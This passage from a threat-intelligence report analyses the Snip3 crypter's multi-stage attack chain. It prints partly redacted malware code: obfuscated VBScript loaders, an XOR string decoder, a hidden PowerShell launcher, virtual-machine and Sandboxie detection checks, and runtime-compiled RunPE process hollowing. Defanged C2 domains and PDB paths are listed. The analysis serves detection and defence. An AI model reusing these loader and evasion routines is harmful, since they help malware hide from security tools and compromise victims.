In some\ncases, however, the attack chain starts with a large install file, such as an Adobe installer, which bundles the next stage.\n\n\n-----\n\nThis Crypter implements several advanced techniques to bypass detection, such as:\n\nExecuting PowerShell code with the ‘remotesigned’ parameter\nValidating the existence of Windows Sandbox and VMWare virtualization\nUsing Pastebin and top4top for staging\nCompiling RunPE loaders on the endpoint in runtime\n\nWe have named the Snip3 Crypter based on the common denominator username taken from the PDB indicator we found in\nan earlier variant.\n\n## snip3 crypter Technical Introduction\n\nFigure 1 - The summarized execution flow\n\nWe classified this Crypter activity based on the following execution flow shown in Figure 1. This Crypter activity was first\nobserved in the wild on February 4, 2021, and still ongoing.\n\nThe related variant’s first submissions on VirusTotal demonstrate its evasive nature, as few security solutions were able to\ndetect it.\n\n### The First Stage: VB Script\n\nThe first stage of the attack chain is a VB Script that’s designed to load and then move the execution to the second-stage\nPowerShell script. We’ve identified four versions containing 11 sub-versions in this initial loader stage, with the main\ndifference between the four being the second-stage PowerShell loading mechanism. The main difference between the 11\nsub-versions is the type of obfuscation that each uses.\n\nAn interesting and unique technique here is that the script executes the PowerShell script with a -RemoteSigned parameter\nalong with the script as a command.\n\n**Version 1 (Seen February 4, 2021 - February 24, 2021)**\n\nThis version initially decodes a PowerShell script that is executed in order to download, save, and execute the second\nstage PowerShell script.\n\n\n-----\n\nOn Error Resume Next\n\nDim WSC, QwErUnBcZsAyOpLmHg\n\nQwErUnBcZsAyOpLmHg = \"POWERSHELL -EXECUTIONPOLICY REMOTESIGNED -COMMAND \"\n\nWSC = cHr (119) 'Deducted, decodes to wSCrIpT.sHELl\n\nSet InBvCzAsKlOpIgHbCzAquJHyt = CreateObject(WSC)\n\nDim PlMbCdQwwTyHbZaHNbVfTH\n\nPlMbCdQwwTyHbZaHNbVfTH = cHr (73) 'Deducted, decodes to PowerShell script in decimal\n\nWScript.Sleep 1000\n\nInBvCzAsKlOpIgHbCzAquJHyt.RUn QwErUnBcZsAyOpLmHg & PlMbCdQwwTyHbZaHNbVfTH, 0\n\nCode Block 1\n\nThe second stage PowerShell is downloaded from top4top.io, an Egpytian file hosting service. Once the second stage is\ndownloaded, the script executes it and saves it under ..\\AppData\\Local\\Temp\\SystemSecurity32.PS1.\n\nFigure 2 - Decoded stage 1 PowerShell\n\nNote that this PowerShell executes with the RemoteSigned parameter although the second stage executes with the Bypass\nparameter. This greatly decreases the efficiency of the technique; further, the bypass is no longer used starting from version\n2.\n\nAdditionally, we have observed a couple of different sub-versions for this script. These sub-versions differ in their\nobfuscation technique (the following example is one of them).\n\n**Version 2 (Seen 01 March 2021 - 29 March 2021)**\n\nThis version contains the second stage PowerShell embedded as a string within the VBS.\n\nThe following string is decoded by an XOR function with an embedded key. This embedded key differs between each\nscript.\n\nPrivate Function vQ(Inp, Key, Mode)\n\nDim z, i, Position, cptZahl, orgZahl, keyZahl, cptString\n\nFor i = 1 To lEn(Inp)\n\nPosition = Position + 1\n\nIf Position > lEn(Key) Then Position = 1\n\nkeyZahl = aSc(Mid(Key, Position, 1))\n\nIf Mode Then\n\norgZahl = aSc(Mid(Inp, i, 1))\n\ncptZahl = orgZahl Xor keyZahl\n\ncptString = hEx(cptZahl)\n\nIf lEn(cptString) < 2 Then cptString = \"0\" & cptString\n\nz = z & cptString\n\nElse\n\nIf i > lEn(Inp) \\ 2 Then Exit For\n\ncptZahl = CByte(\"&\" & \"H\" & Mid(Inp, i * 2 - 1, 2))\norgZahl = cptZahl Xor keyZahl\n\nz = z & cHR(orgZahl)\n\nEnd If\n\nNext\n\nvQ = z\n\nEnd Function\n\n'Deducted code\n\nMyFile.WriteLine(REPLACE(vQ(AqUhNbgAqwpMb, \"[deducted key]\", False), \"%VBS%\", wscript.SCRIPTFULLNAME))\n\nCode Block 2\n\n\n-----\n\nOnce the string is decoded, the script replaces the place holder %VBS% within the decoded PowerShell with the script path\nand saves it to the ..\\AppData\\Local\\Temp folder before the execution. Note that since the mentioned place-holder\npopulates a path containing the username in the PowerShell script, the PowerShell hash differs from victim to victim.\n\nDim SH\nSH = cHR(80 + 7) & cHR(100 + 15) & cHR(66 + 1) & cHR(80 + 2) & cHR(110 - 5) & cHR(85 - 5) & cHR(80 + 4) & cHR(40\n+ 6) & cHR(230 / 2) & cHR(36 * 2) & cHR(60 + 9) & cHR(100 + 8) & cHR(70 + 6)\nSet WS = CreateObject(SH)\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet MyFile = FSO.CreateTextFile(FSO.GetSpecialFolder(2) + \"\\OS64Bits.PS1\", True)\nMyFile.WriteLine(rEPlAcE(vQ(AqUhNbgAqwpMb, \"mp1Z<r4*{RfTJ#SXV:[1c_R%5s_@W8GKbm?KK1*\n\n[bc;QVRMCjodq.#~aFWsAf2SQ-ChVd&\", False), \"%VBS%\", wscript.SCRIPTFULLNAME))\nMyFile.Close\nWS.rUN \"POWERSHELL -eXEcUTiONpOLicY rEmOtEsIgNeD -FILE \" & FSO.GetSpecialFolder(2) + \"\\OS64Bits.PS1\", 0\n\nCode Block 3\n\nThe following table describes the different sub-versions that we have observed:\n\n**Seen Dates** **Powershell Name** **Obfuscation changes**\n\n02 March 2021 WinUpdater32.PS1 Observed only PowerShell agent as payload\n\n01 March 2021 - 19 March 2021 OS64Bits.PS1 Embedded PowerShell as Hex in string\n\n09 March 2021 - 10 March 2021 OS64Bits.PS1 Added junk Chinese characters to a string\n\n10 March 2021 - 23 March 2021 Systray64.PS1 Chinese characters replaced with ‘$@#’\n\n29 March 2021 Systray64.PS1 Added another layer for XOR decoding\n\n**Version 3 (Seen April 8, 2021 - April 20, 2021)**\n\nThis version is quite similar to Version 1, except that the decoded PowerShell script now uses the pastebin.com service to\ndownload the second stage PowerShell. This script saves that\n\nsecond stage under ..\\AppData\\Local\\Temp\\SysTray.PS1 and also creates a VBS within the victim’s startup folder that\nexecutes it to maintain persistence. Here, we have also observed a couple of sub-versions that differ by their obfuscation\nincluding different encoding and junk comments.\n\n\n-----\n\nFigure 3 Pastebin stage 1 PowerShell\n\n**Version 4 (Seen April 26, 2021 - April 30, 2021)**\n\nThis version is very similar to Version 3, except that the author replaced the obfuscation techniques in an attempt to discard\nknown IoC’s from the previous version to avoid detection. Here are a few examples of how:\n\nDifferent names for the VBS variables\nSaves and executes a BAT script that contains the PowerShell shown in Version 3\nUtilizing GetObject instead of CreateObject for retrieving the Shell object, which is a nice way to break the attack\nchain\nAdditional sub-version implemented a decryption function for the PowerShell loader within the BAT\n\nDim BAT\n\nBAT = \"Powershell -WindowStyle Hidden -Command 'IEX ([System.Text.Encoding]::UTF8.GetString(@(35,82,101)))'\"\n'Deducted PowerShell loader\n\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\nSet ShellEX = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\n\nDim TEMPO\n\nTEMPO = fso.getspecialfolder(2) & \"\\1.bat\"\n\nSet MyFile = fso.CreateTextFile(TEMPO, True)\n\nMyFile.WriteLine(Replace(BAT, \"'\", \"\"\"\"))\n\nMyFile.Close\n\nShellEX.SHELLEXECUTE TEMPO,\"\",\"\",\"\",0\n\nCode Block 4\n\n### The Second Stage: PowerShell Script\n\nThe second stage’s PowerShell script is similar to all of the above VBS versions (with minor modifications), and seems to\nbe dynamic based on the Crypter’s configuration.\n\nThe two main purposes of this stage are to detect virtual environments and enact a reflective load of RunPE to execute the\nRAT payload within a hollowed Windows process.\n\n**Virtual Machine and Sandboxie Evasions**\n\nIf configured by the user (adversary), the PowerShell implements functions that attempt to detect if the script is executed\nwithin Microsoft Sandbox, VMWare, VirtualBox, or Sandboxie environments. If the script identifies one of those virtual\nmachine environments, the script terminates without loading the RAT payload.\n\nNote that the author used extra measures to detect a virtual environment since the Anti-VM code that is usually seen in the\nwild does not detect Microsoft Sandbox (a feature introduced by Microsoft two years ago).\n\nTo detect Windows Sandbox, VMWare, or VirtualBox the script extracts the Manufacturer string and compares it to one of\nthe hardcoded strings. This is done by querying for a WMI class named Win32_ComputerSystem utilizing the\n_ManagementObjectSearcher class._\n\n\n-----\n\nFunction VirtualMachineDetector() {\n\n$searcher = (New-Object System.Management.ManagementObjectSearcher((Binary2String(\",.,.[deducted]\"))) #\nDeducted. decodes to ‘Select * from Win32_ComputerSystem’\n\n$items = $searcher.Get()\n\n$Tr = \"\"\n\nforeach ($item in $items) {\n\n[String] $manufacturer = $item[\"Manufacturer\"].ToString().ToLower()\n\nif (($manufacturer -eq \"microsoft corporation\" -and $item[\"Model\"].ToString().ToUpperInvariant().Contains(\"VIRTUAL\")) or $manufacturer.Contains(\"vmware\") -or $item[\"Model\"].ToString() -eq \"VirtualBox\") {\n\n$Tr = \"True\"\n\n}\n\nelse {\n\n$Tr = \"False\"\n\n}\n}\nreturn $Tr\n\n}\n\nCode Block 5\n\nTo detect a Sandboxie environment, the script tries to resolve a handle to a DLL named SbieDll.dll.\n\nFunction DetectSandboxie() {\n\n[Int32] $i = ModuleHandle((Binary2String(\",.,[deducted]\"))) # Deducted. resolves to SbieDll.dll\n\n[String] $s = \"\"\n\nif ($i -eq 0) {\n\n$s = \"False\"\n\n} else {\n\n$s = \"True\"\n}\n\nreturn $s\n\n}\n\nCode Block 6\n\n**Executing the RAT**\n\nThese days most of the RAT loaders embed or download an obfuscated, compiled code to inject a payload into a running\nprocess. In this case, however, the author embedded a compressed (GZIP) source code for this operation. This code is\ncompiled in runtime.\n\nThe source code used here is a modified version of the RunPE from the NYAN-x-CAT GitHub repository\n(hxxps://github[.]com/NYAN-x-CAT/CSharp-RunPE/blob/master/RunPE/RunPE.cs).\n\nBy using this technique, the author introduces an additional stealthy evasion mechanism.\n\nOnce the script is done compiling the RunPE code, the PowerShell loads and executes it along with the RAT payload and\nthe executable path to hollow for injecting the payload. Most of this stage’s PowerShells are configured to hollow\n_InstallUtil.exe, although some of them are configured to hollow RegSvcs.exe._\n\n\n-----\n\nfunction CodeDom([Byte[]] $BB, [String] $TP, [String] $MT) { # BB = Compressed RunPE source code, $TP = Namespace\nand Class in RunPE, $MT = Method to execute in RunPE\n\n$dictionary = new-object 'System.Collections.Generic.Dictionary[[string],[string]]'\n\n$dictionary.Add((Binary2String(\",.,,[deducted]\".Replace(\",\", \"0\").Replace(\".\", \"1\"))), (Binary2String(\"01110[deducted]\"))) #\nDeducted binary encoded strings\n\n$CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider($dictionary)\n\n$CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters\n\n$CompilerParametres.ReferencedAssemblies.Add((Binary2String('010100[deducted]'))) # Deducted binary encoded strings\n\n$CompilerParametres.ReferencedAssemblies.Add((Binary2String('010100[deducted]'))) # Deducted binary encoded strings\n\n$CompilerParametres.ReferencedAssemblies.Add((Binary2String('010100[deducted]'))) # Deducted binary encoded strings\n\n$CompilerParametres.ReferencedAssemblies.Add((Binary2String('011011[deducted]'))) # Deducted binary encoded strings\n\n$CompilerParametres.ReferencedAssemblies.Add((Binary2String('010011[deducted]'))) # Deducted binary encoded strings\n\n$CompilerParametres.IncludeDebugInformation = $false\n\n$CompilerParametres.GenerateExecutable = $false\n\n$CompilerParametres.GenerateInMemory = $true\n\n$CompilerParametres.CompilerOptions += (Binary2String(\"0010111001111001[deducted\")) # Deducted binary encoded\nstrings\n\n$BB = Decompress($BB) # Compressed RunPE source code\n\n[System.CodeDom.Compiler.CompilerResults] $CompilerResults =\n$CsharpCompiler.CompileAssemblyFromSource($CompilerParametres, [System.Text.Encoding]::Default.GetString($BB))\n\n[Type] $T = $CompilerResults.CompiledAssembly.GetType($TP)\n\n[Byte[]] $Bytes = Decompress(@(31,139,8,0,0)) # Deducted decimal compressed bytes (compressed payload)\n\ntry {\n\n[String] $MyPt =\n\n[System.IO.Path]::Combine([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory(),\"InstallUtil.exe\")\n\n[Object[]] $Params=@($MyPt.Replace(\"Framework64\",\"Framework\"),$Bytes)\n\nreturn $T.GetMethod($MT).Invoke($null, $Params)\n\n} catch { }\n\n}\n\nCode Block 7\n\n### The Third Stage: RAT Payloads\n\nThe final payload, chosen by the user, is eventually executed within the hollowed process memory. Our analysis has mostly\nseen either ASyncRAT or RevengeRAT, which often come from an open-source RAT platform originally available through\nthe NYANxCAT Github repository (hxxps://github[.]com/NYAN-x-CAT). Note that we have also discovered the same pattern\n[of utilizing RATs from that repository in Tracking HCrypt: An Active Crypter as a Service.](https://blog.morphisec.com/tracking-hcrypt-an-active-crypter-as-a-service)\n\nIn addition, we also identified one variant that used Agent Tesla and another one that used NetWire RAT.\n\nFigure 4 - AsyncRAT Panel\n\n## Fingerprinting the Crypter’s Users (Actors)\n\n**VB Script Campaigns**\n\nThe following table emphasizes the different versions and IOCs that were used within the variants we observed.\n\n\n-----\n\n1st Stage Version RAT Version C2 Used\n\n\nV1 (4 different subversions)\n\nV2 (3 different subversions)\n\nV3 (2 different subversions)\n\nV3 (3 different subversions)\n\nV4\n\nV1 (4 different subversions)\n\nV2 (2 different subversions)\n\nV3 (3 different subversions)\n\nV4 (2 different subversions)\n\nV1\n\nV2 (4 different subversions)\n\nV3 (3 different subversions)\n\nV4 (2 different subversions)\n\n\nAsyncRAT\n0.5.7B\n\nAsyncRAT\n0.5.7B\n\nAsyncRAT\n0.5.7B\n\nRevengeRAT\n\n\nasin8989.ddns[.]net\n\nasin8988.ddns[.]net\n\nasin8990.ddns[.]net\n\nadobe.myactivedirectory[.]com\n\nloading8992.bounceme[.]net\n\nh0pe1759.ddns[.]net\n\n\nRevengeRAT kimjoy.ddns[.]net\n\nkimjoy007.dyndns[.]org\n\n\nV2 Agent Tesla SMTP mail.alamdarhardware[.]com\n(sharjah@alamdarhardware[.]com)\n\nThe following table correlates with the first stage.

However, in this case, it’s embedded as a precompiled DLL. This scavenge provided us with the\nfollowing PDB string from the DLL:\n\nC:\\Users\\Snip3\\OneDrive\\Bureau\\Sparta Project\\projFUD\\projFUD\\obj\\Debug\\projFUD.pdb\n\nWith the following PDB string, we discovered additional variants that we believe are from the same author due to repeating\npatterns within the code flow. Here are a few examples:\n\nC:\\Users\\Snip3\\source\\repos\\CSClipper\\CSClipper\\obj\\Debug\\CSClipper.pdb\n\nC:\\Users\\Snip3\\source\\repos\\Startup\\Startup\\obj\\Debug\\fdgerttry.pdb\n\nC:\\Users\\Snip3\\source\\repos\\Deep Crypter v4\\Deep Crypter v4\\obj\\Debug\\Deep Crypter v4.pdb\n\nC:\\Users\\Snip3\\source\\repos\\Mozilla\\Mozilla\\obj\\Debug\\Mozilla.pdb\n\nFurther investigation led to a personal identity that we strongly believe is the author of these malicious activities.\n\n## Conclusions\n\nThe Snip3 Crypter’s ability to identify sandboxing and virtual environments make it especially capable of bypassing\ndetection-centric solutions. As a result, organizations with detection-focused stacks need to be wary of attacks like Snip3\nand others.
